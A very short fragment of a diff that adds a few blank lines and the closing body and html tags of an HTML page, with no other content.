+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
